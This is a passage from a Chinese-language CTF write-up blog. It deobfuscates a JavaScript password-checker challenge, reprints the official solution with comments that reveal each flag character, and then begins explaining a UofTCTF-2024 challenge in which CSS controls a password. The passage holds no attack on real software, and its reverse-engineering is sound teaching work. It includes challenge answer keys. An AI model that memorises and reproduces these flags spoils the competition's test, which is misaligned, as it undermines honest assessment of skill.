class="hljs-number">1</span>, <span class="hljs-number">2</span>) !== (<span class="hljs-title class_">String</span>.<span class="hljs-property">fromCodePoint</span> + <span class="hljs-string">&#x27;&#x27;</span>)[<span class="hljs-built_in">parseInt</span>((<span class="hljs-built_in">parseInt</span> + <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">3</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">147</span>] ||<br>      password[(<span class="hljs-built_in">parseInt</span>(<span class="hljs-number">41</span>, <span class="hljs-number">6</span>) &gt;&gt; <span class="hljs-number">2</span>) - <span class="hljs-number">2</span>] !== <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(<span class="hljs-number">123</span>) ||<br>      password[<span class="hljs-number">4</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) !== password[<span class="hljs-number">7</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">72</span> ||<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">5</span>, <span class="hljs-number">7</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(), <span class="hljs-function"><span class="hljs-params">_0x2d4d73</span> =&gt;</span> _0x2d4d73.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>)).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x5b85c5</span> =&gt;</span> _0x5b85c5 + <span class="hljs-number">213</span>)) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>([<span class="hljs-number">285</span>, <span class="hljs-number">257</span>, <span class="hljs-number">297</span>])) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">let</span> password_8_12_rev = password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">reverse</span>();<br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">5</span>; i++) &#123;<br>        password_8_12_rev[i] = password_8_12_rev[i].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + i + <span class="hljs-title function_">getAdder</span>(i);<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (_0x1fbd51) &#123;<br>      password_8_12_rev = password_8_12_rev.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x24cda7</span> =&gt;</span> _0x24cda7 += _0x1fbd51.<span class="hljs-property">constructor</span>.<span class="hljs-property">name</span>.<span class="hljs-property">length</span> - <span class="hljs-number">4</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">MD5</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(...password_8_12_rev)) !== <span class="hljs-string">&#x27;098f6bcd4621d373cade4e832627b4f6&#x27;</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">MD5</span>(password.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">12</span>) + <span class="hljs-string">&#x27;&#x27;</span>) !== <span class="hljs-string">&#x27;812b4ba287f5ee0bc9d43bbf5bbe87fb&#x27;</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    password_8_12_rev = (password[<span class="hljs-number">8</span>] + password[<span class="hljs-number">11</span>]).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>);<br>    password_8_12_rev.<span class="hljs-title function_">push</span>(password_8_12_rev.<span class="hljs-title function_">shift</span>());<br>    <span class="hljs-keyword">if</span> (password.<span class="hljs-title function_">substring</span>(<span class="hljs-number">14</span>, <span class="hljs-number">16</span>) !== <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(...password_8_12_rev.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x5b5ec8</span> =&gt;</span> <span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(+_0x5b5ec8) ? _0x5b5ec8.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">5</span> : <span class="hljs-number">48</span>)) || password[password[<span class="hljs-number">7</span>] - password[<span class="hljs-number">10</span>]] !== <span class="hljs-title function_">atob</span>(<span class="hljs-string">&#x27;dQ==&#x27;</span>) || password.<span class="hljs-title function_">indexOf</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">117</span>)) !== password[<span class="hljs-number">7</span>] - password[<span class="hljs-number">17</span>] || <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x7bf0a6</span> =&gt;</span> _0x7bf0a6.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) ^ getAdder.<span class="hljs-property">name</span>[password[<span class="hljs-number">7</span>]].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>))) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>([<br>      <span class="hljs-number">72</span>,<br>      <span class="hljs-number">90</span><br>    ].<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x40ab0d</span> =&gt;</span> _0x40ab0d ^ <span class="hljs-title class_">String</span>.<span class="hljs-property">fromCodePoint</span>.<span class="hljs-property">name</span>[password[<span class="hljs-number">17</span>] - <span class="hljs-number">1</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>)))) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(...password.<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">filter</span>(<span class="hljs-function">(<span class="hljs-params">_0x5edfac, _0x2965d2</span>) =&gt;</span> _0x2965d2 &gt; <span class="hljs-number">15</span> &amp;&amp; _0x2965d2 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span>).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x2ffa6d</span> =&gt;</span> _0x2ffa6d.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) ^ password.<span class="hljs-property">length</span> + password[<span class="hljs-number">7</span>])) !== <span class="hljs-title function_">atob</span>(<span class="hljs-string">&#x27;g5Go&#x27;</span>)) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (password[password.<span class="hljs-property">length</span> - <span class="hljs-number">2</span>] !== <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(((&#123;&#125; + <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">9</span>) / <span class="hljs-number">3</span>)) || password[<span class="hljs-number">1</span> + password[<span class="hljs-number">7</span>]] !== <span class="hljs-title function_">giggity</span>()[<span class="hljs-number">5</span>]) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (_0x4d4983) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getAdder</span>(<span class="hljs-params">_0x430c9d</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (_0x430c9d) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">34</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">44</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">26</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">60</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">101</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">giggity</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> giggity.<span class="hljs-property">caller</span>.<span class="hljs-property">name</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里面有些变量作了重新命名，便于审计。</p><p>整体的验证流程都很简单，就是把flag给拆分开来进行判断，</p><p>比如首先验证长度为21</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (password.<span class="hljs-property">length</span> !== <span class="hljs-number">21</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>然后逐步逐步验证</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">if</span> (password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) !== (<span class="hljs-title class_">String</span>.<span class="hljs-property">fromCodePoint</span> + <span class="hljs-string">&#x27;&#x27;</span>)[<span class="hljs-built_in">parseInt</span>((<span class="hljs-built_in">parseInt</span> + <span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">3</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">147</span>] ||<br>  password[(<span class="hljs-built_in">parseInt</span>(<span class="hljs-number">41</span>, <span class="hljs-number">6</span>) &gt;&gt; <span class="hljs-number">2</span>) - <span class="hljs-number">2</span>] !== <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(<span class="hljs-number">123</span>) ||<br>  password[<span class="hljs-number">4</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) !== password[<span class="hljs-number">7</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">72</span> ||<br>  <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(password.<span class="hljs-title function_">slice</span>(<span class="hljs-number">5</span>, <span class="hljs-number">7</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&#x27;&#x27;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(), <span class="hljs-function"><span class="hljs-params">_0x2d4d73</span> =&gt;</span> _0x2d4d73.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>)).<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">_0x5b85c5</span> =&gt;</span> _0x5b85c5 + <span class="hljs-number">213</span>)) !== <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>([<span class="hljs-number">285</span>, <span class="hljs-number">257</span>, <span class="hljs-number">297</span>])) &#123;<br>  <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-17%2023.59.19.png" alt="截屏2024-01-17 23.59.19"></p><p>对于其中的一些语句可以直接使用控制台打印调试，整体都是这个思路，这里贴上官方wp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br></pre></td><td class="code"><pre><code class="hljs js"><span class="hljs-keyword">function</span> <span class="hljs-title function_">checkPassword</span>(<span class="hljs-params">_0x38d32a</span>) &#123;<br>  <span class="hljs-keyword">try</span> &#123;<br>    <span class="hljs-comment">// Password length is 21.</span><br>    <span class="hljs-keyword">if</span> (_0x38d32a.<span class="hljs-property">length</span> !== <span class="hljs-number">21</span>) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<br>      _0x38d32a.<span class="hljs-title function_">slice</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>) !==<br>        (<span class="hljs-title class_">String</span>.<span class="hljs-property">fromCodePoint</span> + <span class="hljs-string">&quot;&quot;</span>)[<br>          <span class="hljs-built_in">parseInt</span>((<span class="hljs-built_in">parseInt</span> + <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">3</span>), <span class="hljs-number">16</span>) - <span class="hljs-number">147</span><br>        ] <span class="hljs-comment">/* password[1] = &#x27;p&#x27; */</span> ||<br>      _0x38d32a[(<span class="hljs-built_in">parseInt</span>(<span class="hljs-number">41</span>, <span class="hljs-number">6</span>) &gt;&gt; <span class="hljs-number">2</span>) - <span class="hljs-number">2</span>] !==<br>        <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(<span class="hljs-number">123</span>) <span class="hljs-comment">/* password[4] = &#x27;&#123;&#x27; */</span> ||<br>      _0x38d32a[<span class="hljs-number">4</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) !==<br>        _0x38d32a[<span class="hljs-number">7</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">72</span> <span class="hljs-comment">/* password[7] = &#x27;3&#x27;. */</span> ||<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<br>        <span class="hljs-title class_">Array</span>.<span class="hljs-title function_">from</span>(<br>          _0x38d32a.<span class="hljs-title function_">slice</span>(<span class="hljs-number">5</span>, <span class="hljs-number">7</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">reverse</span>().<span class="hljs-title function_">join</span>(),<br>          <span class="hljs-function">(<span class="hljs-params">_0x2d4d73</span>) =&gt;</span> _0x2d4d73.<span class="hljs-title function_">codePointAt</span>(<span class="hljs-number">0</span>)<br>        ).<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_0x5b85c5</span>) =&gt;</span> _0x5b85c5 + <span class="hljs-number">213</span>)<br>      ) !==<br>        <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>([<br>          <span class="hljs-number">285</span>, <span class="hljs-number">257</span>, <span class="hljs-number">297</span>,<br>        ]) <span class="hljs-comment">/* password[5] = &#x27;T&#x27;, password[6] = &#x27;H&#x27; */</span><br>    ) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-comment">/* For password[8], password[9], password[10], password[11] */</span><br>    <span class="hljs-keyword">let</span> _0x3c7a5c = _0x38d32a.<span class="hljs-title function_">slice</span>(<span class="hljs-number">8</span>, <span class="hljs-number">12</span>).<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">reverse</span>();<br><br>    <span class="hljs-keyword">try</span> &#123;<br>      <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> _0x396662 = <span class="hljs-number">0</span>; _0x396662 &lt; <span class="hljs-number">5</span>; _0x396662++) &#123;<br>        _0x3c7a5c[_0x396662] =<br>          _0x3c7a5c[_0x396662].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + _0x396662 + <span class="hljs-title function_">getAdder</span>(_0x396662);<br>      &#125;<br>    &#125; <span class="hljs-keyword">catch</span> (_0x1fbd51) &#123;<br>      _0x3c7a5c = _0x3c7a5c.<span class="hljs-title function_">map</span>(<br>        <span class="hljs-function">(<span class="hljs-params">_0x24cda7</span>) =&gt;</span> (_0x24cda7 += _0x1fbd51.<span class="hljs-property">constructor</span>.<span class="hljs-property">name</span>.<span class="hljs-property">length</span> - <span class="hljs-number">4</span>)<br>      );<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<br>      <span class="hljs-title class_">MD5</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(..._0x3c7a5c)) !==<br>      <span class="hljs-string">&quot;098f6bcd4621d373cade4e832627b4f6&quot;</span> <span class="hljs-comment">/* password[8] = &#x27;0&#x27;, password[9] = &#x27;R&#x27;, password[10] = &#x27;3&#x27;, password[11] = &#x27;M&#x27; */</span><br>    ) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<br>      <span class="hljs-title class_">MD5</span>(_0x38d32a.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">12</span>) + <span class="hljs-string">&quot;&quot;</span>) !==<br>      <span class="hljs-string">&quot;812b4ba287f5ee0bc9d43bbf5bbe87fb&quot;</span> <span class="hljs-comment">/* password[12] = &#x27;_&#x27; */</span><br>    ) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    _0x3c7a5c = (_0x38d32a[<span class="hljs-number">8</span>] + _0x38d32a[<span class="hljs-number">11</span>]).<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&quot;</span>);<br>    _0x3c7a5c.<span class="hljs-title function_">push</span>(_0x3c7a5c.<span class="hljs-title function_">shift</span>());<br>    <span class="hljs-keyword">if</span> (<br>      _0x38d32a.<span class="hljs-title function_">substring</span>(<span class="hljs-number">14</span>, <span class="hljs-number">16</span>) !==<br>        <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(<br>          ..._0x3c7a5c.<span class="hljs-title function_">map</span>(<span class="hljs-function">(<span class="hljs-params">_0x5b5ec8</span>) =&gt;</span><br>            <span class="hljs-title class_">Number</span>.<span class="hljs-built_in">isNaN</span>(+_0x5b5ec8) ? _0x5b5ec8.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">5</span> : <span class="hljs-number">48</span><br>          )<br>        ) <span class="hljs-comment">/* password[14] = &#x27;R&#x27; password[15] = &#x27;0&#x27; */</span> ||<br>      _0x38d32a[_0x38d32a[<span class="hljs-number">7</span>] - _0x38d32a[<span class="hljs-number">10</span>]] !==<br>        <span class="hljs-title function_">atob</span>(<span class="hljs-string">&quot;dQ==&quot;</span>) <span class="hljs-comment">/* password[0] = &#x27;u&#x27; */</span> ||<br>      _0x38d32a.<span class="hljs-title function_">indexOf</span>(<span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-number">117</span>)) !==<br>        _0x38d32a[<span class="hljs-number">7</span>] - _0x38d32a[<span class="hljs-number">17</span>] <span class="hljs-comment">/* password[17] = &#x27;3&#x27; */</span> ||<br>      <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<br>        _0x38d32a<br>          .<span class="hljs-title function_">slice</span>(<span class="hljs-number">2</span>, <span class="hljs-number">4</span>)<br>          .<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&quot;</span>)<br>          .<span class="hljs-title function_">map</span>(<br>            <span class="hljs-function">(<span class="hljs-params">_0x7bf0a6</span>) =&gt;</span><br>              _0x7bf0a6.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) ^<br>              getAdder.<span class="hljs-property">name</span>[_0x38d32a[<span class="hljs-number">7</span>]].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>)<br>          )<br>      ) !==<br>        <span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(<br>          [<span class="hljs-number">72</span>, <span class="hljs-number">90</span>].<span class="hljs-title function_">map</span>(<br>            <span class="hljs-function">(<span class="hljs-params">_0x40ab0d</span>) =&gt;</span><br>              _0x40ab0d ^<br>              <span class="hljs-title class_">String</span>.<span class="hljs-property">fromCodePoint</span>.<span class="hljs-property">name</span>[_0x38d32a[<span class="hljs-number">17</span>] - <span class="hljs-number">1</span>].<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>)<br>          )<br>        ) <span class="hljs-comment">/* password[2] = &#x27;f&#x27;, password[3] = &#x27;t&#x27; */</span><br>    ) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<br>      <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCodePoint</span>(<br>        ..._0x38d32a<br>          .<span class="hljs-title function_">split</span>(<span class="hljs-string">&quot;&quot;</span>)<br>          .<span class="hljs-title function_">filter</span>(<br>            <span class="hljs-function">(<span class="hljs-params">_0x5edfac, _0x2965d2</span>) =&gt;</span> _0x2965d2 &gt; <span class="hljs-number">15</span> &amp;&amp; _0x2965d2 % <span class="hljs-number">2</span> == <span class="hljs-number">0</span><br>          )<br>          .<span class="hljs-title function_">map</span>(<br>            <span class="hljs-function">(<span class="hljs-params">_0x2ffa6d</span>) =&gt;</span><br>              _0x2ffa6d.<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) ^ (_0x38d32a.<span class="hljs-property">length</span> + _0x38d32a[<span class="hljs-number">7</span>])<br>          )<br>      ) !==<br>      <span class="hljs-title function_">atob</span>(<br>        <span class="hljs-string">&quot;g5Go&quot;</span><br>      ) <span class="hljs-comment">/* password[16] = &#x27;V&#x27;, password[18] = &#x27;D&#x27;, password[20] = &#x27;&#125;&#x27; */</span><br>    ) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<br>      _0x38d32a[_0x38d32a.<span class="hljs-property">length</span> - <span class="hljs-number">2</span>] !==<br>        <span class="hljs-title class_">String</span>.<span class="hljs-title function_">fromCharCode</span>(<span class="hljs-title class_">Math</span>.<span class="hljs-title function_">floor</span>(((&#123;&#125; + <span class="hljs-string">&quot;&quot;</span>).<span class="hljs-title function_">charCodeAt</span>(<span class="hljs-number">0</span>) + <span class="hljs-number">9</span>) / <span class="hljs-number">3</span>)) ||<br>      _0x38d32a[<span class="hljs-number">1</span> + _0x38d32a[<span class="hljs-number">7</span>]] !== <span class="hljs-title function_">giggity</span>()[<span class="hljs-number">5</span>] <span class="hljs-comment">/* password[19] = ! */</span><br>    ) &#123;<br>      <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;<br>  &#125; <span class="hljs-keyword">catch</span> (_0x4d4983) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>;<br>  &#125;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">getAdder</span>(<span class="hljs-params">_0x430c9d</span>) &#123;<br>  <span class="hljs-keyword">switch</span> (_0x430c9d) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">34</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">44</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">26</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">60</span>;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">101</span>;<br>&#125;<br><span class="hljs-keyword">function</span> <span class="hljs-title function_">giggity</span>(<span class="hljs-params"></span>) &#123;<br>  <span class="hljs-keyword">return</span> giggity.<span class="hljs-property">caller</span>.<span class="hljs-property">name</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="UofTCTF-2024"><a href="#UofTCTF-2024" class="headerlink" title="UofTCTF-2024"></a>UofTCTF-2024</h2><p>这里是<a href="https://github.com/pteacher/CTF_WRITEUPS/tree/main/UofTCTF_2024/CSS_Password">题目</a></p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.05.54.png" style="zoom: 33%;" /><p>题目只有一个html文件，打开后是这个样子，大意是需要控制上面19个字节使得下面的灯全亮即可获得正确flag。</p><p>阅读html文件得知，这里实际上就是有css控制。</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.09.10.png" style="zoom: 33%;" /><p>这里是控制每一个比特的样式，</p><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.09.49.png"></p><p>这里是用鼠标点击作为控制，当点击<code>latch_set</code>按钮时，这个按钮下的子元素<code>latch_state</code>就往左移；当点击<code>latch_reset</code>按钮时，这个按钮下的子元素<code>latch_state</code>就往右移，</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.10.18.png" alt="截屏2024-01-18 15.10.18" style="zoom:50%;" /><p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.12.39.png" alt="截屏2024-01-18 15.12.39"></p><p>这里则是控制整一个字节的样式</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.15.22.png" alt="截屏2024-01-18 15.15.22" style="zoom:50%;" /><p>这里则是控制LED灯的样式</p><img src="https://yring-me.oss-cn-beijing.aliyuncs.com/test/%E6%88%AA%E5%B1%8F2024-01-18%2015.14.48.png" alt="截屏2024-01-18 15.14.48" style="zoom:50%;" 